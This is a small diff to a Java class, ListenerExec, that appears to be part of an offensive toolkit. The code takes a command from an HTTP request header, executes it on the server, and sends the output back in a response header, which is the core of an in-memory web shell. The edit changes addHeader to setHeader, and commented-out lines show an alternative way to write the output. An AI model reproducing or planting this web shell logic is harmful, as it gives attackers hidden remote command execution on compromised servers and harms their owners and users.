@@ -85,7 +85,7 @@ public class ListenerExec implements InvocationHandler {
             Object header = invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
             String result = exec((String) header);
             Object response = getResponse(request);
-            invokeMethod(response, "addHeader", new Class[]{String.class, String.class}, new Object[]{RHEADER, result});
+            invokeMethod(response, "setHeader", new Class[]{String.class, String.class}, new Object[]{RHEADER, result});
 //            invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
 //            Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
 //            invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
